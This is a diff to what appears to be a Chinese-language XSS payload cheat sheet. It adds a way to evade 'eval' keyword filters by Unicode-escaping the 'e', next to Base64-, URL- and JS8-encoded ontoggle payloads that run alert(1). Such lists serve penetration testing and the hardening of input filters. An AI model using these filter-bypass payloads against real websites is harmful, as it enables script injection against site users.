@@ -110,6 +110,8 @@
   ```html
   Base64编码：
   <details open ontoggle=eval(atob('YWxlcnQoMSk=')) >
+  eval拦截的话，可以试试，把 e Unicode编码
+  <details open ontoggle=\u0065val(atob('YWxlcnQoMSk=')) >
   url编码： 
   <details open ontoggle=eval('%61%6c%65%72%74%28%31%29') >
   JS8编码：
